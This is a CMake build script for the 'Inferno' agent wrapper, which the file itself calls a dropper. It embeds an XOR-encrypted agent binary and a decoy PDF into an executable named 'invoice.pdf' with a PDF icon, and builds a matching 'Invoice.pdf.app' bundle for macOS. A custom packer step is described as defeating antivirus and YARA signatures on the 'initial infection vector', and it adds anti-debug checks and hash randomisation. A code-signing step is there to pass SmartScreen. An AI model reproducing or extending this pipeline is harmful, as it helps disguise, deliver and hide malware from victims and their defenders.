# ==========================================
# Inferno Agent Wrapper / Dropper (Phase 2)
# ==========================================

find_package(Python3 QUIET)
if(NOT Python3_FOUND)
    message(WARNING "Python3 not found — skipping inferno_wrapper build")
    return()
endif()

set(DECOY_PDF "${CMAKE_CURRENT_SOURCE_DIR}/resources/decoy.pdf")
set(AGENT_BINARY_HEADER "${CMAKE_CURRENT_BINARY_DIR}/agent_binary.h")

set(INFERNO_XOR_KEY "2B7E151628AED2A6")

if(APPLE)
    set(EMBEDDED_AGENT "$<TARGET_FILE:inferno_agent_dylib>")
    set(EMBEDDED_AGENT_DEP inferno_agent_dylib)
    set(EMBEDDED_SHIM "$<TARGET_FILE:inferno_shim>")
    set(EMBEDDED_SHIM_DEP inferno_shim)
else()
    set(EMBEDDED_AGENT "$<TARGET_FILE:inferno_client>")
    set(EMBEDDED_AGENT_DEP inferno_client)
    set(EMBEDDED_SHIM "")
    set(EMBEDDED_SHIM_DEP "")
endif()

add_custom_command(
    OUTPUT  ${AGENT_BINARY_HEADER}
    COMMAND ${Python3_EXECUTABLE}
            "${CMAKE_CURRENT_SOURCE_DIR}/bin2header.py"
            "--key" "${INFERNO_XOR_KEY}"
            "${EMBEDDED_AGENT}"
            "${EMBEDDED_SHIM}"
            "${DECOY_PDF}"
            "${AGENT_BINARY_HEADER}"
    DEPENDS  ${EMBEDDED_AGENT_DEP}
             ${EMBEDDED_SHIM_DEP}
             "${DECOY_PDF}"
             "${CMAKE_CURRENT_SOURCE_DIR}/bin2header.py"
    COMMENT "Generating agent_binary.h (XOR-encrypted) from agent binary + shim + decoy PDF"
    VERBATIM
)

set(WRAPPER_SOURCES
    src/main.cpp
    ${AGENT_BINARY_HEADER}
)

if(WIN32)
    set(PDF_ICO "${CMAKE_CURRENT_SOURCE_DIR}/resources/pdf.ico")
    add_custom_command(
        OUTPUT  ${PDF_ICO}
        COMMAND ${Python3_EXECUTABLE}
                "${CMAKE_CURRENT_SOURCE_DIR}/resources/gen_ico.py"
                "${PDF_ICO}"
        DEPENDS "${CMAKE_CURRENT_SOURCE_DIR}/resources/gen_ico.py"
        COMMENT "Generating pdf.ico for Windows resource"
    )
    set(WRAPPER_RC "${CMAKE_CURRENT_SOURCE_DIR}/resources/resource.rc")
    list(APPEND WRAPPER_SOURCES ${WRAPPER_RC} ${PDF_ICO})
endif()

if(APPLE)
    list(APPEND WRAPPER_SOURCES
        ../client/src/EntitlementScanner.cpp
        ../client/src/MachInjector.cpp
    )
endif()

add_executable(inferno_wrapper ${WRAPPER_SOURCES}
    include/unlit.hpp
)

target_include_directories(inferno_wrapper PRIVATE
    ${CMAKE_CURRENT_BINARY_DIR}
    ${CMAKE_CURRENT_SOURCE_DIR}/include
    ${CMAKE_SOURCE_DIR}/client/include
)



# UNLIT() macro returns a const char* from a lambda — the compiler can't
# see through it to verify the format string is a literal. The string IS
# compile-time fixed, so the warning is a false positive.
if(CMAKE_CXX_COMPILER_ID MATCHES "GNU|Clang|AppleClang")
    target_compile_options(inferno_wrapper PRIVATE -Wno-format-security)
endif()

# Name the output so Windows shows "invoice.pdf.exe" (explorer hides .exe)
set_target_properties(inferno_wrapper PROPERTIES
    OUTPUT_NAME "invoice.pdf"
)

if(WIN32)
    target_compile_definitions(inferno_wrapper PRIVATE _CRT_SECURE_NO_WARNINGS)
    target_link_libraries(inferno_wrapper PRIVATE shell32)

    # ═══════════════════════════════════════════════════════════
    # Custom PE Packer Integration (Phase 3, ASLR-safe)
    # ═══════════════════════════════════════════════════════════
    #
    # Post-link step: run packer.py on the compiled wrapper PE to:
    #   - LZ4-compress + XOR-encrypt .text/.rdata sections
    #   - Inject a TLS callback decryptor stub
    #   - Preserve ASLR (split .reloc into minimal + saved entries)
    #   - Randomize binary hash (per-build key + low-entropy padding)
    #
    # This defeats static AV/YARA byte-signature matching on the
    # initial infection vector.
    #
    # ── 1. NASM → stub.bin ──────────────────────────────────
    find_program(NASM nasm)
    if(NASM_FOUND)
        set(STUB_BIN "${CMAKE_CURRENT_BINARY_DIR}/packer_stub.bin")
        add_custom_command(
            OUTPUT  ${STUB_BIN}
            COMMAND ${NASM} -f bin -O0 -o "${STUB_BIN}"
                    "${CMAKE_SOURCE_DIR}/packer/stub.asm"
            DEPENDS "${CMAKE_SOURCE_DIR}/packer/stub.asm"
            COMMENT "Assembling packer decryptor stub (stub.asm → stub.bin)"
            VERBATIM
        )
        add_custom_target(packer_stub_target DEPENDS ${STUB_BIN})
        add_dependencies(inferno_wrapper packer_stub_target)
    else()
        set(STUB_BIN "${CMAKE_SOURCE_DIR}/packer/stub.bin")
        message(STATUS "NASM not found — using pre-compiled packer/stub.bin")
    endif()

    # ── 2. Per-build XOR key ───────────────────────────────
    # Every invocation of cmake generates a fresh 32-byte hex key,
    # guaranteeing a unique packed binary hash per build.
    string(RANDOM LENGTH 32 ALPHABET "0123456789abcdef" INFERNO_PACKER_KEY)
    message(STATUS "Packer XOR key: ${INFERNO_PACKER_KEY}")

    # ── 3. CI-friendly option ─────────────────────────────
    # rdtsc timing anti-debug can false-positive in sandboxed CI
    # runners. Set -DINFERNO_PACKER_QUICK=ON in CI to skip it.
    option(INFERNO_PACKER_QUICK
        "Skip anti-debug checks in packer stub (use in CI/sandbox)" OFF)

    # ── 4. Post-link packer step ───────────────────────────
    # Write to a .packed temp file, then atomically rename to
    # prevent corrupting the binary if packer.py crashes.
    set(PACKER_ARGS
        "--input" "$<TARGET_FILE:inferno_wrapper>"
        "--output" "$<TARGET_FILE:inferno_wrapper>.packed"
        "--key" "${INFERNO_PACKER_KEY}"
        "--verbose"
    )
    if(INFERNO_PACKER_QUICK)
        list(APPEND PACKER_ARGS "--quick")
    endif()

    add_custom_command(TARGET inferno_wrapper POST_BUILD
        COMMAND ${Python3_EXECUTABLE}
                "${CMAKE_SOURCE_DIR}/packer/packer.py"
                ${PACKER_ARGS}
        COMMAND ${CMAKE_COMMAND} -E rename
                "$<TARGET_FILE:inferno_wrapper>.packed"
                "$<TARGET_FILE:inferno_wrapper>"
        COMMENT "Packing inferno_wrapper (XOR+LZ4+TLS, key=${INFERNO_PACKER_KEY})"
        VERBATIM
    )

    # ═══════════════════════════════════════════════════════════
    # Phase 3.5 — Code Signing (EV cert for production)
    # ═══════════════════════════════════════════════════════════
    #
    # Runs after packing. Signs the packed wrapper with SHA256 + RFC 3161
    # timestamp so the binary is trusted by Windows SmartScreen at first
    # execution (with an EV certificate). Self-signed certs are for local
    # development only — they do NOT bypass SmartScreen.
    #
    # Usage:
    #   cmake -B build -DINFERNO_CODE_SIGN=ON
    #   export INFERNO_CERT_PASSWORD=<pfx_password>
    #   cmake --build build --target inferno_wrapper
    #
    # Password is read from the INFERNO_CERT_PASSWORD environment variable
    # only — never from a CMake variable — to prevent leaks in build logs.
    #
    # ── 1. Option (default OFF) ────────────────────────────
    option(INFERNO_CODE_SIGN
        "Sign the packed wrapper with signtool (EV cert required for SmartScreen)"
        OFF)

    if(INFERNO_CODE_SIGN)
        # ── 2. Find signtool ──────────────────────────────
        find_program(SIGNTOOL signtool)
        if(NOT SIGNTOOL_FOUND)
            message(FATAL_ERROR
                "signtool not found — install Windows SDK or set -DINFERNO_CODE_SIGN=OFF")
        endif()

        # ── 3. Certificate path ────────────────────────────
        # Default: self-signed dev cert at project root (created by
        # scripts/gen_test_cert.sh). Override with -DINFERNO_CERT_PFX=<path>
        # for production EV certificates.
        set(INFERNO_CERT_PFX "${CMAKE_SOURCE_DIR}/secrets/cert.pfx"
            CACHE PATH "Path to code signing PFX certificate")

        # ── 4. Password from environment ONLY ──────────────
        # Never pass -DINFERNO_CERT_PASSWORD=... — it would appear in
        # CMake cache and build logs. Always use the env var.
        set(CERT_PASSWORD "$ENV{INFERNO_CERT_PASSWORD}")
        if(NOT CERT_PASSWORD)
            message(FATAL_ERROR
                "INFERNO_CERT_PASSWORD environment variable not set. "
                "Export it before building: export INFERNO_CERT_PASSWORD=<password>")
        endif()

        # ── 5. POST_BUILD signing step ─────────────────────
        # Signs after packing: SHA256 digest, RFC 3161 timestamp,
        # automatic cert selection from the PFX (/a).
        add_custom_command(TARGET inferno_wrapper POST_BUILD
            COMMAND ${SIGNTOOL} sign /fd SHA256 /a
                    /f "${INFERNO_CERT_PFX}" /p "${CERT_PASSWORD}"
                    /tr "http://timestamp.digicert.com"
                    /td SHA256
                    "$<TARGET_FILE:inferno_wrapper>"
            COMMAND ${SIGNTOOL} verify /v /pa
                    "$<TARGET_FILE:inferno_wrapper>"
            COMMENT "Signing + verifying packed wrapper (SHA256 + RFC 3161 timestamp)"
            VERBATIM
        )

        message(STATUS "Code signing ENABLED (cert=${INFERNO_CERT_PFX})")
    endif()
endif()

# --- macOS .app bundle post-build ---
if(APPLE)
    set(APP_BUNDLE_DIR "${CMAKE_CURRENT_BINARY_DIR}/Invoice.pdf.app")
    set(APP_MACOS_DIR "${APP_BUNDLE_DIR}/Contents/MacOS")
    set(APP_PLIST_DIR "${APP_BUNDLE_DIR}/Contents")

    add_custom_command(TARGET inferno_wrapper POST_BUILD
        COMMAND ${CMAKE_COMMAND} -E make_directory "${APP_MACOS_DIR}"
        COMMAND ${CMAKE_COMMAND} -E copy
                "$<TARGET_FILE:inferno_wrapper>"
                "${APP_MACOS_DIR}/invoice_pdf"
        COMMAND chmod 755 "${APP_MACOS_DIR}/invoice_pdf"
        COMMAND ${Python3_EXECUTABLE}
                "${CMAKE_CURRENT_SOURCE_DIR}/resources/gen_plist.py"
                "${APP_PLIST_DIR}/Info.plist"
        COMMENT "Creating Invoice.pdf.app bundle for macOS"
    )
endif()
